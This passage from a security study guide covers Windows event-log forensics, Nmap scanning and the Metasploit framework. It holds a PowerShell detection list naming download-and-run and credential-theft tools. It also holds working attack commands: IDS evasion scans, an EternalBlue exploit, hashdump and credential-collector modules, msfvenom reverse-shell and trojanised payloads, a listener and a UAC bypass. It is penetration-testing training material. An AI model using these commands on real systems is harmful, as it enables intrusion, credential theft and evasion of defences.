For detailed information, review individual artifact files.

Recommended next steps:
1. Review autostart entries for suspicious programs
2. Examine USB device history for unauthorized devices
3. Check network connection history for suspicious IPs/domains
4. Analyze user activity for indicators of compromise
5. Cross-reference execution artifacts (Shimcache, BAM/DAM, UserAssist)

================================================================================
EOF

echo ""
echo "[+] Analysis complete!"
echo "[+] Results saved to: $OUTPUT_DIR"
echo "[+] Summary report: $OUTPUT_DIR/00_SUMMARY_REPORT.txt"
echo ""
echo "Files generated:"
ls -lh "$OUTPUT_DIR"
```

### Windows Event Log Analysis

**Parse EVTX Files (Windows Event Logs)**

```bash
# Install python-evtx
pip install python-evtx

# Convert EVTX to XML
evtx_dump.py Security.evtx > security_events.xml

# Convert to JSON
evtx_dump.py --json Security.evtx > security_events.json
```

**Python EVTX Parser**

```python
#!/usr/bin/env python3
import Evtx.Evtx as evtx
import sys
import json
from collections import defaultdict
import xml.etree.ElementTree as ET

def parse_evtx(evtx_file):
    """Parse Windows Event Log (EVTX) file"""
    
    try:
        with evtx.Evtx(evtx_file) as log:
            events = []
            event_ids = defaultdict(int)
            
            print(f"[*] Parsing {evtx_file}...")
            
            for record in log.records():
                try:
                    # Parse XML
                    xml_str = record.xml()
                    root = ET.fromstring(xml_str)
                    
                    # Namespace
                    ns = {'ns': 'http://schemas.microsoft.com/win/2004/08/events/event'}
                    
                    # Extract event data
                    system = root.find('ns:System', ns)
                    
                    event_id = system.find('ns:EventID', ns).text if system.find('ns:EventID', ns) is not None else 'Unknown'
                    time_created = system.find('ns:TimeCreated', ns).get('SystemTime') if system.find('ns:TimeCreated', ns) is not None else 'Unknown'
                    computer = system.find('ns:Computer', ns).text if system.find('ns:Computer', ns) is not None else 'Unknown'
                    
                    # Count event IDs
                    event_ids[event_id] += 1
                    
                    event = {
                        'event_id': event_id,
                        'timestamp': time_created,
                        'computer': computer,
                        'record_number': record.record_num(),
                        'xml': xml_str
                    }
                    
                    events.append(event)
                    
                except Exception as e:
                    continue
            
            return events, event_ids
    
    except Exception as e:
        print(f"[-] Error parsing EVTX: {e}")
        return [], {}

def analyze_security_events(events):
    """Analyze security event log for forensic indicators"""
    
    indicators = {
        'logons': [],
        'logon_failures': [],
        'account_changes': [],
        'privilege_use': [],
        'process_creation': [],
        'service_install': []
    }
    
    for event in events:
        event_id = event['event_id']
        
        # Successful logons (4624)
        if event_id == '4624':
            indicators['logons'].append(event)
        
        # Failed logons (4625)
        elif event_id == '4625':
            indicators['logon_failures'].append(event)
        
        # Account created (4720)
        elif event_id == '4720':
            indicators['account_changes'].append(event)
        
        # Account enabled (4722)
        elif event_id == '4722':
            indicators['account_changes'].append(event)
        
        # Password changed (4724)
        elif event_id == '4724':
            indicators['account_changes'].append(event)
        
        # Special privileges assigned (4672)
        elif event_id == '4672':
            indicators['privilege_use'].append(event)
        
        # Process creation (4688)
        elif event_id == '4688':
            indicators['process_creation'].append(event)
        
        # Service installed (4697)
        elif event_id == '4697':
            indicators['service_install'].append(event)
    
    return indicators

def print_event_summary(events, event_ids):
    """Print summary of events"""
    
    print(f"\n[+] EVENT LOG SUMMARY")
    print("=" * 80)
    print(f"Total Events: {len(events)}")
    print(f"Unique Event IDs: {len(event_ids)}")
    
    print(f"\n[+] TOP EVENT IDs")
    print("-" * 80)
    print(f"{'Event ID':<15} {'Count':<10} {'Description'}")
    print("-" * 80)
    
    # Event ID descriptions (common ones)
    descriptions = {
        '4624': 'Successful Logon',
        '4625': 'Failed Logon',
        '4648': 'Logon with Explicit Credentials',
        '4672': 'Special Privileges Assigned',
        '4688': 'Process Creation',
        '4689': 'Process Termination',
        '4697': 'Service Installed',
        '4698': 'Scheduled Task Created',
        '4720': 'User Account Created',
        '4722': 'User Account Enabled',
        '4724': 'Password Reset',
        '4725': 'User Account Disabled',
        '4726': 'User Account Deleted',
        '4732': 'Member Added to Security Group',
        '4756': 'Member Added to Universal Security Group',
        '5140': 'Network Share Accessed',
        '5142': 'Network Share Created',
        '7045': 'Service Installed (System Log)'
    }
    
    for event_id, count in sorted(event_ids.items(), key=lambda x: x[1], reverse=True)[:20]:
        desc = descriptions.get(event_id, 'Unknown')
        print(f"{event_id:<15} {count:<10} {desc}")

def print_security_analysis(indicators):
    """Print security event analysis"""
    
    print(f"\n[+] SECURITY ANALYSIS")
    print("=" * 80)
    
    # Logons
    if indicators['logons']:
        print(f"\n[+] Successful Logons: {len(indicators['logons'])}")
        print("-" * 80)
        for event in indicators['logons'][:10]:
            print(f"  Time: {event['timestamp']}")
            print(f"  Record: {event['record_number']}")
            # Parse XML for more details
            try:
                root = ET.fromstring(event['xml'])
                ns = {'ns': 'http://schemas.microsoft.com/win/2004/08/events/event'}
                event_data = root.find('ns:EventData', ns)
                if event_data is not None:
                    for data in event_data.findall('ns:Data', ns):
                        name = data.get('Name')
                        if name in ['TargetUserName', 'IpAddress', 'LogonType']:
                            print(f"  {name}: {data.text}")
            except:
                pass
            print()
    
    # Failed Logons
    if indicators['logon_failures']:
        print(f"\n[!] Failed Logons: {len(indicators['logon_failures'])}")
        print("-" * 80)
        for event in indicators['logon_failures'][:10]:
            print(f"  Time: {event['timestamp']}")
            try:
                root = ET.fromstring(event['xml'])
                ns = {'ns': 'http://schemas.microsoft.com/win/2004/08/events/event'}
                event_data = root.find('ns:EventData', ns)
                if event_data is not None:
                    for data in event_data.findall('ns:Data', ns):
                        name = data.get('Name')
                        if name in ['TargetUserName', 'IpAddress', 'FailureReason']:
                            print(f"  {name}: {data.text}")
            except:
                pass
            print()
    
    # Account Changes
    if indicators['account_changes']:
        print(f"\n[!] Account Changes: {len(indicators['account_changes'])}")
        print("-" * 80)
        for event in indicators['account_changes'][:10]:
            print(f"  Event ID: {event['event_id']}")
            print(f"  Time: {event['timestamp']}")
            print()
    
    # Service Installations
    if indicators['service_install']:
        print(f"\n[!] Service Installations: {len(indicators['service_install'])}")
        print("-" * 80)
        for event in indicators['service_install'][:10]:
            print(f"  Time: {event['timestamp']}")
            try:
                root = ET.fromstring(event['xml'])
                ns = {'ns': 'http://schemas.microsoft.com/win/2004/08/events/event'}
                event_data = root.find('ns:EventData', ns)
                if event_data is not None:
                    for data in event_data.findall('ns:Data', ns):
                        name = data.get('Name')
                        if name in ['ServiceName', 'ServiceFileName']:
                            print(f"  {name}: {data.text}")
            except:
                pass
            print()

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <Security.evtx>")
        sys.exit(1)
    
    evtx_file = sys.argv[1]
    
    # Parse events
    events, event_ids = parse_evtx(evtx_file)
    
    if not events:
        print("[-] No events parsed")
        sys.exit(1)
    
    # Print summary
    print_event_summary(events, event_ids)
    
    # If Security log, do detailed analysis
    if 'Security' in evtx_file or 'security' in evtx_file:
        indicators = analyze_security_events(events)
        print_security_analysis(indicators)
    
    # Save to JSON
    output_file = evtx_file.replace('.evtx', '_parsed.json')
    with open(output_file, 'w') as f:
        # Convert to JSON-serializable format
        output = []
        for event in events[:1000]:  # First 1000 events
            output.append({
                'event_id': event['event_id'],
                'timestamp': event['timestamp'],
                'computer': event['computer'],
                'record_number': event['record_number']
            })
        json.dump(output, f, indent=2)
    
    print(f"\n[+] JSON output saved to: {output_file}")
```

### Common Forensic Event IDs

**Critical Security Event IDs**

```bash
# Authentication Events
4624 - Successful Logon
4625 - Failed Logon
4634 - Logoff
4647 - User Initiated Logoff
4648 - Logon with Explicit Credentials
4672 - Special Privileges Assigned to New Logon

# Account Management
4720 - User Account Created
4722 - User Account Enabled
4723 - Password Change Attempted
4724 - Password Reset Attempted
4725 - User Account Disabled
4726 - User Account Deleted
4738 - User Account Changed
4740 - User Account Locked Out
4767 - User Account Unlocked

# Group Membership
4728 - Member Added to Global Security Group
4732 - Member Added to Local Security Group
4756 - Member Added to Universal Security Group

# Service Events
4697 - Service Installed (Security Log)
7045 - Service Installed (System Log)
7034 - Service Crashed
7036 - Service Started/Stopped
7040 - Service Startup Type Changed

# Process Events
4688 - Process Creation
4689 - Process Termination

# Object Access
5140 - Network Share Accessed
5142 - Network Share Created
5145 - Network Share Access Check

# Policy Changes
4719 - System Audit Policy Changed
4946 - Windows Firewall Rule Added
4947 - Windows Firewall Rule Modified
4950 - Windows Firewall Setting Changed

# Scheduled Tasks
4698 - Scheduled Task Created
4699 - Scheduled Task Deleted
4700 - Scheduled Task Enabled
4701 - Scheduled Task Disabled
4702 - Scheduled Task Updated

# PowerShell Events (Windows PowerShell log)
4103 - Module Logging
4104 - Script Block Logging
```

### PowerShell Event Log Analysis

**Extract PowerShell Commands from Event Logs**

```python
#!/usr/bin/env python3
import Evtx.Evtx as evtx
import sys
import xml.etree.ElementTree as ET
import re

def extract_powershell_commands(evtx_file):
    """Extract PowerShell command history from event logs"""
    
    try:
        with evtx.Evtx(evtx_file) as log:
            commands = []
            
            print(f"[*] Extracting PowerShell commands from {evtx_file}...")
            
            for record in log.records():
                try:
                    xml_str = record.xml()
                    root = ET.fromstring(xml_str)
                    
                    ns = {'ns': 'http://schemas.microsoft.com/win/2004/08/events/event'}
                    
                    system = root.find('ns:System', ns)
                    event_id = system.find('ns:EventID', ns).text if system.find('ns:EventID', ns) is not None else 'Unknown'
                    
                    # Event ID 4104 = Script Block Logging
                    if event_id == '4104':
                        time_created = system.find('ns:TimeCreated', ns).get('SystemTime')
                        
                        event_data = root.find('ns:EventData', ns)
                        if event_data is not None:
                            script_block = None
                            
                            for data in event_data.findall('ns:Data', ns):
                                if data.get('Name') == 'ScriptBlockText':
                                    script_block = data.text
                                    break
                            
                            if script_block:
                                commands.append({
                                    'timestamp': time_created,
                                    'command': script_block,
                                    'event_id': event_id
                                })
                
                except Exception as e:
                    continue
            
            return commands
    
    except Exception as e:
        print(f"[-] Error: {e}")
        return []

def analyze_suspicious_commands(commands):
    """Identify suspicious PowerShell commands"""
    
    suspicious_patterns = [
        r'Invoke-Expression',
        r'IEX',
        r'Invoke-WebRequest',
        r'iwr',
        r'wget',
        r'curl',
        r'DownloadString',
        r'DownloadFile',
        r'Net\.WebClient',
        r'Start-Process',
        r'Invoke-Command',
        r'EncodedCommand',
        r'-enc',
        r'-e\s',
        r'FromBase64String',
        r'System\.Reflection\.Assembly',
        r'Get-Process',
        r'Get-WmiObject',
        r'Win32_Process',
        r'Invoke-Mimikatz',
        r'Invoke-PowerShellTcp',
        r'powercat',
        r'nishang',
        r'Empire'
    ]
    
    suspicious = []
    
    for cmd in commands:
        for pattern in suspicious_patterns:
            if re.search(pattern, cmd['command'], re.IGNORECASE):
                suspicious.append({
                    **cmd,
                    'reason': f"Matched pattern: {pattern}"
                })
                break
    
    return suspicious

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <PowerShell-Operational.evtx>")
        print("Location: Microsoft-Windows-PowerShell%4Operational.evtx")
        sys.exit(1)
    
    evtx_file = sys.argv[1]
    
    # Extract commands
    commands = extract_powershell_commands(evtx_file)
    
    print(f"\n[+] Total PowerShell commands extracted: {len(commands)}")
    
    if commands:
        # Analyze for suspicious activity
        suspicious = analyze_suspicious_commands(commands)
        
        if suspicious:
            print(f"\n[!] SUSPICIOUS POWERSHELL ACTIVITY ({len(suspicious)} instances)")
            print("=" * 120)
            
            for cmd in suspicious[:20]:  # First 20
                print(f"\nTimestamp: {cmd['timestamp']}")
                print(f"Reason: {cmd['reason']}")
                print(f"Command:\n{cmd['command'][:500]}")  # First 500 chars
                print("-" * 120)
        else:
            print("[+] No suspicious patterns detected")
        
        # Save all commands
        output_file = 'powershell_commands.txt'
        with open(output_file, 'w') as f:
            for cmd in commands:
                f.write(f"Timestamp: {cmd['timestamp']}\n")
                f.write(f"Command:\n{cmd['command']}\n")
                f.write("=" * 80 + "\n\n")
        
        print(f"\n[+] All commands saved to: {output_file}")
```

---

## Important Subtopics for Further Study

- **Memory Forensics** - Volatility Framework, extracting processes, network connections, malware from RAM dumps
- **Disk Forensics** - File carving, deleted file recovery, MFT analysis, INDX records
- **Timeline Analysis** - Creating super timelines with Plaso/log2timeline, correlating multiple artifact sources
- **Mobile Forensics** - Android/iOS backup analysis, app data extraction, SQLite database forensics
- **Cloud Forensics** - O365 logs, AWS CloudTrail, Azure Activity logs, Google Workspace audit logs
- **Malware Analysis** - Static and dynamic analysis, sandbox evasion detection, IOC extraction

---

# Mastery (Kali Linux Specific)

## Nmap Advanced Usage

Nmap is the definitive network reconnaissance tool. Mastery requires understanding packet crafting, timing strategies, NSE scripting, and evasion techniques.

### Core Scanning Techniques

**TCP Scan Methods:**

```bash
# TCP SYN scan (default, requires root)
nmap -sS target_ip

# TCP Connect scan (no root required)
nmap -sT target_ip

# TCP ACK scan (firewall rule mapping)
nmap -sA target_ip

# TCP Window scan (BSD systems differentiation)
nmap -sW target_ip

# TCP Maimon scan (FIN/ACK probe)
nmap -sM target_ip

# TCP Null scan (no flags set)
nmap -sN target_ip

# TCP FIN scan
nmap -sF target_ip

# TCP Xmas scan (FIN, PSH, URG flags)
nmap -sX target_ip
```

**UDP and Protocol Scans:**

```bash
# UDP scan (slow but critical)
nmap -sU target_ip

# Fast UDP scan (top 100 ports)
nmap -sU --top-ports 100 target_ip

# Combined TCP/UDP scan
nmap -sS -sU -p T:80,443,U:53,161 target_ip

# IP Protocol scan
nmap -sO target_ip

# SCTP INIT scan
nmap -sY target_ip
```

### Port Specification and Range Control

```bash
# Specific ports
nmap -p 22,80,443,3389 target_ip

# Port ranges
nmap -p 1-1000 target_ip
nmap -p- target_ip  # All 65535 ports

# Top N ports
nmap --top-ports 1000 target_ip

# Protocol-specific ports
nmap -p T:80,443,U:53,161 target_ip

# Exclude ports
nmap -p 1-1000 --exclude-ports 22,80 target_ip

# Fast scan (100 most common ports)
nmap -F target_ip
```

### Host Discovery Methods

```bash
# Ping sweep
nmap -sn 192.168.1.0/24

# No ping (skip host discovery)
nmap -Pn target_ip

# TCP SYN ping
nmap -PS22,80,443 target_ip

# TCP ACK ping
nmap -PA80,443 target_ip

# UDP ping
nmap -PU53,161 target_ip

# ICMP ping types
nmap -PE target_ip  # Echo request
nmap -PP target_ip  # Timestamp request
nmap -PM target_ip  # Netmask request

# ARP ping (local network only)
nmap -PR 192.168.1.0/24

# Combined discovery
nmap -PS22,80,443 -PA80,443 -PU53 target_ip

# Treat all as online
nmap -Pn -p- target_ip
```

### Service and Version Detection

```bash
# Service version detection
nmap -sV target_ip

# Version intensity (0-9, default 7)
nmap -sV --version-intensity 9 target_ip
nmap -sV --version-light target_ip  # Intensity 2

# Version detection with scripts
nmap -sV -sC target_ip

# Aggressive scan (OS, version, scripts, traceroute)
nmap -A target_ip

# OS detection only
nmap -O target_ip

# Aggressive OS detection
nmap -O --osscan-guess target_ip
nmap -O --osscan-limit target_ip  # Limit to promising targets

# Service probe list
nmap -sV --allports target_ip  # Don't exclude any ports

# RPC service info
nmap -sV --version-trace target_ip
```

### Timing and Performance

**Timing Templates (T0-T5):**

```bash
# Paranoid - IDS evasion (5 min per probe)
nmap -T0 target_ip

# Sneaky - IDS evasion (15 sec per probe)
nmap -T1 target_ip

# Polite - reduced network load
nmap -T2 target_ip

# Normal - default timing
nmap -T3 target_ip

# Aggressive - fast, reliable networks
nmap -T4 target_ip

# Insane - very fast, may miss results
nmap -T5 target_ip
```

**Manual Timing Control:**

```bash
# Minimum RTT timeout (milliseconds)
nmap --min-rtt-timeout 100ms target_ip

# Maximum RTT timeout
nmap --max-rtt-timeout 1000ms target_ip

# Initial RTT timeout
nmap --initial-rtt-timeout 500ms target_ip

# Maximum retries
nmap --max-retries 3 target_ip

# Host timeout
nmap --host-timeout 30m target_ip

# Scan delay (milliseconds between probes)
nmap --scan-delay 1s target_ip
nmap --max-scan-delay 2s target_ip

# Parallelism
nmap --min-parallelism 10 --max-parallelism 100 target_ip

# Rate limiting (packets per second)
nmap --min-rate 100 target_ip
nmap --max-rate 1000 target_ip
```

### NSE (Nmap Scripting Engine)

**Script Categories:**

```bash
# Default safe scripts
nmap -sC target_ip
nmap --script=default target_ip

# All scripts (dangerous, can crash services)
nmap --script=all target_ip

# Specific category
nmap --script=vuln target_ip
nmap --script=exploit target_ip
nmap --script=auth target_ip
nmap --script=brute target_ip
nmap --script=discovery target_ip
nmap --script=safe target_ip

# Multiple categories
nmap --script="vuln and safe" target_ip
nmap --script="not intrusive" target_ip

# Specific script
nmap --script=http-enum target_ip
nmap --script=smb-vuln-ms17-010 target_ip

# Multiple scripts
nmap --script=http-enum,http-headers,http-title target_ip

# Wildcard
nmap --script="http-*" target_ip
nmap --script="smb-vuln-*" target_ip
```

**Script Arguments:**

```bash
# Pass arguments to scripts
nmap --script=http-enum --script-args http-enum.basepath='/admin/' target_ip

# Multiple arguments
nmap --script=mysql-brute --script-args userdb=/usr/share/wordlists/users.txt,passdb=/usr/share/wordlists/passwords.txt target_ip

# Script help
nmap --script-help=http-enum

# Update script database
nmap --script-updatedb
```

**Common Useful Scripts:**

```bash
# SMB vulnerability scanning
nmap --script=smb-vuln-ms17-010 -p445 target_ip
nmap --script=smb-vuln-* -p445 target_ip

# SMB enumeration
nmap --script=smb-enum-shares,smb-enum-users -p445 target_ip
nmap --script=smb-os-discovery -p445 target_ip

# HTTP enumeration
nmap --script=http-enum -p80,443 target_ip
nmap --script=http-headers,http-methods,http-title -p80 target_ip
nmap --script=http-shellshock --script-args uri=/cgi-bin/test.sh -p80 target_ip

# SSL/TLS testing
nmap --script=ssl-enum-ciphers -p443 target_ip
nmap --script=ssl-heartbleed -p443 target_ip
nmap --script=ssl-cert -p443 target_ip

# DNS enumeration
nmap --script=dns-brute --script-args dns-brute.domain=example.com target_ip
nmap --script=dns-zone-transfer --script-args dns-zone-transfer.domain=example.com target_ip

# SSH auditing
nmap --script=ssh-auth-methods,ssh-hostkey,ssh2-enum-algos -p22 target_ip
nmap --script=ssh-brute -p22 target_ip

# FTP enumeration
nmap --script=ftp-anon,ftp-bounce -p21 target_ip

# SNMP enumeration
nmap --script=snmp-brute,snmp-interfaces,snmp-processes -p161 target_ip

# MySQL enumeration
nmap --script=mysql-enum,mysql-databases,mysql-variables -p3306 target_ip

# RDP security
nmap --script=rdp-enum-encryption,rdp-vuln-ms12-020 -p3389 target_ip

# Broadcast discovery
nmap --script=broadcast-dhcp-discover
nmap --script=broadcast-dns-service-discovery
```

### Firewall and IDS Evasion

**Fragmentation:**

```bash
# Fragment packets (8 bytes)
nmap -f target_ip

# Custom fragment size (must be multiple of 8)
nmap --mtu 16 target_ip
nmap --mtu 24 target_ip
```

**Decoy Scanning:**

```bash
# Random decoys
nmap -D RND:10 target_ip

# Specific decoys
nmap -D decoy1,decoy2,ME,decoy3 target_ip

# Your IP position (ME) can be placed anywhere
nmap -D 192.168.1.5,192.168.1.6,ME,192.168.1.7 target_ip
```

**Source Port Manipulation:**

```bash
# Spoof source port (common allowed ports)
nmap --source-port 53 target_ip
nmap -g 53 target_ip

# Common allowed ports: 20, 53, 80, 443
nmap --source-port 80 target_ip
```

**MAC Address Spoofing:**

```bash
# Spoof MAC address
nmap --spoof-mac 0 target_ip  # Random MAC
nmap --spoof-mac Dell target_ip  # Dell vendor
nmap --spoof-mac 00:11:22:33:44:55 target_ip  # Specific MAC
```

**Data Length and Randomization:**

```bash
# Append random data
nmap --data-length 25 target_ip

# Randomize target order
nmap --randomize-hosts target1 target2 target3

# Bad checksum (firewall might not calculate)
nmap --badsum target_ip
```

**Idle Scan (Zombie Scan):**

```bash
# Use zombie host for scanning
nmap -sI zombie_ip target_ip

# Verify zombie suitability
nmap -O -v zombie_ip
```

**Advanced Evasion:**

```bash
# Custom TTL
nmap --ttl 64 target_ip

# IP options
nmap --ip-options "L 192.168.1.1 192.168.1.2" target_ip

# Send packets with specified IP options
nmap --ip-options "R" target_ip  # Record route
nmap --ip-options "T" target_ip  # Timestamp
```

### Output Formats

```bash
# Normal output
nmap -oN scan_results.txt target_ip

# XML output
nmap -oX scan_results.xml target_ip

# Grepable output
nmap -oG scan_results.gnmap target_ip

# Script kiddie output
nmap -oS scan_results.skid target_ip

# All formats
nmap -oA scan_results target_ip

# Append to existing file
nmap --append-output -oN scan_results.txt target_ip

# Verbose output
nmap -v target_ip
nmap -vv target_ip  # Very verbose

# Debugging
nmap -d target_ip
nmap -dd target_ip  # More debugging
```

### Practical Scanning Strategies

**Initial Network Sweep:**

```bash
# Quick host discovery
nmap -sn -T4 192.168.1.0/24 -oG live_hosts.txt

# Extract live IPs
grep "Up" live_hosts.txt | cut -d " " -f 2 > targets.txt
```

**Fast Port Scan:**

```bash
# Top 1000 ports, all live hosts
nmap -iL targets.txt -T4 --top-ports 1000 -oA fast_scan

# SYN scan common ports
nmap -iL targets.txt -sS -T4 -p 21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 -oA common_ports
```

**Comprehensive Scan:**

```bash
# All TCP ports with version detection
nmap -iL targets.txt -p- -sV -T4 -oA full_tcp

# Add UDP top ports
nmap -iL targets.txt -sU --top-ports 100 -sV -T4 -oA top_udp
```

**Vulnerability Scan:**

```bash
# Vuln scripts on discovered services
nmap -iL targets.txt -sV --script=vuln -T4 -oA vuln_scan

# Specific service vulnerabilities
nmap -p 445 --script=smb-vuln-* 192.168.1.0/24 -oA smb_vulns
nmap -p 80,443 --script=http-vuln-* 192.168.1.0/24 -oA http_vulns
```

**Stealth Scan:**

```bash
# Slow, fragmented, with decoys
nmap -sS -T1 -f -D RND:10 --randomize-hosts -p 80,443 target_ip -oN stealth_scan.txt

# Idle scan through zombie
nmap -Pn -sI zombie_ip -p- target_ip
```

### Nmap with Proxychains

```bash
# Scan through SOCKS proxy
proxychains nmap -sT -Pn target_ip

# Note: Only TCP Connect (-sT) works with proxychains
# -Pn required as ICMP doesn't work through SOCKS
```

### Parsing Nmap Results

**XML to HTML Conversion:**

```bash
# Using xsltproc
xsltproc scan_results.xml -o scan_results.html

# Using Nmap's XSL
xsltproc /usr/share/nmap/nmap.xsl scan_results.xml -o scan_results.html
```

**Extracting Data from Grepable Format:**

```bash
# Extract open ports per host
awk '/open/{print $2, $4}' scan_results.gnmap

# Find hosts with specific port open
grep "22/open" scan_results.gnmap | cut -d " " -f 2

# Count hosts with web servers
grep -c "80/open\|443/open" scan_results.gnmap
```

**Using ndiff for Scan Comparison:**

```bash
# Compare two scans
ndiff scan1.xml scan2.xml

# HTML comparison report
ndiff --html scan1.xml scan2.xml > comparison.html
```

### Nmap Performance Optimization

```bash
# Fast scan optimized for CTF/pentesting
nmap -sS -T4 -p- --min-rate 1000 --max-retries 2 target_ip

# Balance between speed and accuracy
nmap -sS -T4 -p- --min-rate 500 --max-retries 3 -sV --version-intensity 5 target_ip

# Ultra-fast scan (may miss results)
nmap -sS -T5 -p- --min-rate 5000 --max-retries 1 target_ip
```

### Nmap Integration with Other Tools

**Feed Results to Metasploit:**

```bash
# Import Nmap XML into Metasploit
msfconsole
msf6 > db_import scan_results.xml
msf6 > hosts
msf6 > services
```

**Masscan Integration (for speed):**

```bash
# Ultra-fast initial scan with masscan
masscan -p1-65535 192.168.1.0/24 --rate=10000 -oL masscan_results.txt

# Parse masscan results for Nmap verification
grep "open" masscan_results.txt | awk '{print $4":"$3}' > targets_ports.txt

# Verify with Nmap
nmap -sV -iL targets_ports.txt -oA verified_scan
```

## Metasploit Framework

Metasploit is the industry-standard exploitation framework providing exploit modules, payloads, encoders, and post-exploitation capabilities.

### Framework Architecture

**Core Components:**

- **Modules:** Exploits, auxiliary, post, payloads, encoders, nops, evasion
- **Database:** PostgreSQL backend for session/data management
- **RPC:** Remote API for automation
- **Console:** msfconsole (primary interface)

### Database Setup and Management

```bash
# Start PostgreSQL
sudo systemctl start postgresql

# Initialize MSF database
sudo msfdb init

# Check database status
sudo msfdb status

# Reinitialize (if issues)
sudo msfdb delete
sudo msfdb init
```

**Database Operations in Console:**

```bash
msfconsole

# Check database connection
msf6 > db_status

# Workspace management
msf6 > workspace -a project_name
msf6 > workspace project_name
msf6 > workspace -l
msf6 > workspace -d old_project

# Import scan results
msf6 > db_import /path/to/nmap_scan.xml

# View imported data
msf6 > hosts
msf6 > services
msf6 > vulns

# Search database
msf6 > hosts -S 192.168.1
msf6 > services -p 445
msf6 > services -s http
```

### Module Types and Usage

**Exploit Modules:**

```bash
# Search exploits
msf6 > search type:exploit platform:windows smb

# Use exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show advanced
msf6 exploit(windows/smb/ms17_010_eternalblue) > show missing

# Set options
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.10
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.5

# Show targets
msf6 exploit(windows/smb/ms17_010_eternalblue) > show targets

# Show payloads
msf6 exploit(windows/smb/ms17_010_eternalblue) > show payloads

# Run exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > run
```

**Auxiliary Modules:**

```bash
# Scanners
msf6 > use auxiliary/scanner/portscan/tcp
msf6 > use auxiliary/scanner/smb/smb_version
msf6 > use auxiliary/scanner/http/dir_scanner
msf6 > use auxiliary/scanner/ssh/ssh_login

# Fuzzing
msf6 > use auxiliary/fuzzers/http/http_form_field

# Admin modules
msf6 > use auxiliary/admin/smb/psexec_command

# DoS modules
msf6 > use auxiliary/dos/tcp/synflood

# Example: SMB scanning
msf6 > use auxiliary/scanner/smb/smb_version
msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(scanner/smb/smb_version) > set THREADS 10
msf6 auxiliary(scanner/smb/smb_version) > run
```

**Post-Exploitation Modules:**

```bash
# Requires active session
msf6 > sessions -l

# Use post module
msf6 > use post/windows/gather/hashdump
msf6 post(windows/gather/hashdump) > set SESSION 1
msf6 post(windows/gather/hashdump) > run

# Common post modules
msf6 > use post/windows/gather/credentials/credential_collector
msf6 > use post/windows/gather/enum_shares
msf6 > use post/windows/gather/enum_applications
msf6 > use post/multi/recon/local_exploit_suggester
msf6 > use post/windows/manage/enable_rdp
```

### Payload Generation and Selection

**Payload Types:**

- **Singles:** Self-contained, no stage required
- **Stagers:** Small payload that fetches larger stage
- **Stages:** Full-featured payload delivered by stager

```bash
# List payloads for current exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > show payloads

# Set specific payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Common payloads
# Windows
windows/meterpreter/reverse_tcp
windows/x64/meterpreter/reverse_tcp
windows/shell/reverse_tcp
windows/x64/shell_reverse_tcp

# Linux
linux/x86/meterpreter/reverse_tcp
linux/x64/meterpreter/reverse_tcp
linux/x86/shell/reverse_tcp

# Multi-platform
generic/shell_reverse_tcp
cmd/unix/reverse
```

**Msfvenom Payload Generation:**

```bash
# List formats
msfvenom --list formats

# List payloads
msfvenom --list payloads

# Windows reverse shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe -o shell.exe

# Linux reverse shell
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f elf -o shell.elf

# Web payloads
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f raw -o shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f raw -o shell.jsp
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f asp -o shell.asp

# Scripting payloads
msfvenom -p cmd/unix/reverse_python LHOST=192.168.1.5 LPORT=4444 -f raw
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f raw -o shell.py

# Encoded payloads
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -e x64/xor_dynamic -i 5 -f exe -o encoded.exe

# Bad characters removal (for buffer overflow)
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.5 LPORT=4444 -b '\x00\x0a\x0d' -f python

# Multiple iterations
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o encoded.exe

# Template injection
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -x /path/to/template.exe -k -f exe -o trojan.exe
```

**Setting Up Multi/Handler:**

```bash
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.1.5
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > exploit -j  # Run as job

# List active handlers
msf6 > jobs -l

# Kill job
msf6 > jobs -k [job_id]
```

### Meterpreter Essentials

**Basic Commands:**

```bash
# System information
meterpreter > sysinfo
meterpreter > getuid
meterpreter > getpid

# Process management
meterpreter > ps
meterpreter > migrate [pid]
meterpreter > kill [pid]

# File system
meterpreter > pwd
meterpreter > ls
meterpreter > cd C:\\Windows\\Temp
meterpreter > cat file.txt
meterpreter > download C:\\file.txt /root/file.txt
meterpreter > upload /root/tool.exe C:\\Windows\\Temp\\tool.exe

# Search files
meterpreter > search -f *.txt
meterpreter > search -d C:\\ -f passwords.txt

# Execute commands
meterpreter > execute -f cmd.exe -i -H
meterpreter > shell
```

**Privilege Escalation:**

```bash
# Get SYSTEM privileges
meterpreter > getsystem

# Bypass UAC
meterpreter > background
msf6 > use exploit/windows/local/bypassuac_injection
msf6 exploit(windows/local/bypassuac_injection) > set SESSION 1
